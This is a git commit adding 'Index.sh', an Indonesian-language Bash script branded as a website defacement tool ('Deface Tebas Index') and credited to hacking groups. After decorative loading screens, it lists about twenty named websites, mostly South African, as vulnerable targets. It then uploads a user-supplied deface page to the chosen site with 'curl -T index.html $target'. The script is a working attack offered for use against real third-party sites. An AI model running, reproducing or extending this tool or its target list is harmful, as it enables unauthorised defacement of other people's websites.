93dc7106eec53362758d2e55bff2123a551aac48
NetworkSecurity69 <56723931+NetworkSecurity69@users.noreply.github.com>
2019-10-18 19:57:56 +0700

    Create Index.sh

---
+++ Index.sh
@@ -0,0 +1,117 @@
+#Gila_coding
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+echo $red " Loading ................. "
+clear
+sleep 0.5
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 0.5
+echo $red " Loading ................. "
+clear
+sleep 0.5
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 0.5
+echo $red " Loading ................. "
+clear
+sleep 0.5
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 0.5
+echo $red " Loading ................. "
+clear
+sleep 0.5
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 0.5
+echo $red " Loading ................. "
+clear
+sleep 0.5
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 0.5
+echo $red " Loading ................. "
+clear
+sleep 0.5
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 0.5
+echo $red " Loading ................. "
+clear
+sleep 0.5
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 0.5
+echo $red " Loading ................. "
+clear
+sleep .05
+echo $white " Tunggu Sebentar ................. "
+clear
+sleep 1.5;
+clear
+echo
+toilet -f future "    DEFACE" | lolcat
+echo
+figlet -f future "NetworkSecurityTeam" | lolcat
+echo " ======================================== " | lolcat
+echo " ==             TEBAS INDEX            == " | lolcat
+echo " ======================================== " | lolcat
+echo " ==   Script Created By N3S7E4MCyber   == " | lolcat
+echo " == Thanks To : Young Master Team      == " | lolcat
+echo " ==             Muslim Cyber Army      == " | lolcat
+echo " ==             Network Security Team  == " | lolcat
+echo " ======================================== " | lolcat
+
+echo " Tekan Enter Untuk Melanjutkan "
+echo $white "╭─"$yellow"Cyber"
+read  -p " ╰─ : " Tekan Enter
+sleep 2.5
+echo
+toilet -f future "Deface Tebas Index" | lolcat
+echo
+echo
+echo $yellow "List Target / Web Vuln"
+echo $red "http://contsol.co.za"
+echo $white "http://colourfactory.co.za"
+echo $red "http://chillibitez.co.za"
+echo $white "http://chasingfantasia.com"
+echo $red "http://centraltech.co.za"
+echo $white "http://cblandscapes.co.za"
+echo $red "http://crimsonmonkeyweb.com"
+echo $white "http://kevinbutho.com"
+echo $red "http://prorepafrica.com"
+echo $white "http://xposurephotography.co.za"
+echo $red "http://windmillsandporcupines.co.za"
+echo $white "http://tcnig.co.za"
+echo $red "http://ayk.co.za"
+echo $white "http://thehellenic.co.za"
+echo $red "http://valdicare.co.za"
+echo $white "http://scnc.co.za"
+echo $red "http://bitsandpieces.co.za"
+echo $white "http://itsengineering.co.za"
+echo $red "http://windmillsandporcupines.co.za"
+echo $white "http://floralandfresh.co.za"  
+echo
+echo $red "Masuka Website Target !"
+read -p  "Target > " target 
+echo
+echo " Simpan Scriptnya Dengan Nama Index.html "
+echo $red "Simpan Script Deface Lu Di Memory Internal Di Luar Folder "
+clear
+echo $red "Masukan Scriptnyaa "
+read -p " Script >" script
+echo " Waitt "
+sleep 2.5
+curl -T index.html $target
+echo $red "["$yellow"Owner"$red"]"$cyan"===>"$green" $target/$script"
+sleep 2
+echo $red "["$yellow"Owner"$red"]"$cyan"===>"$green" $target"
+sleep 2
+exit
+clear
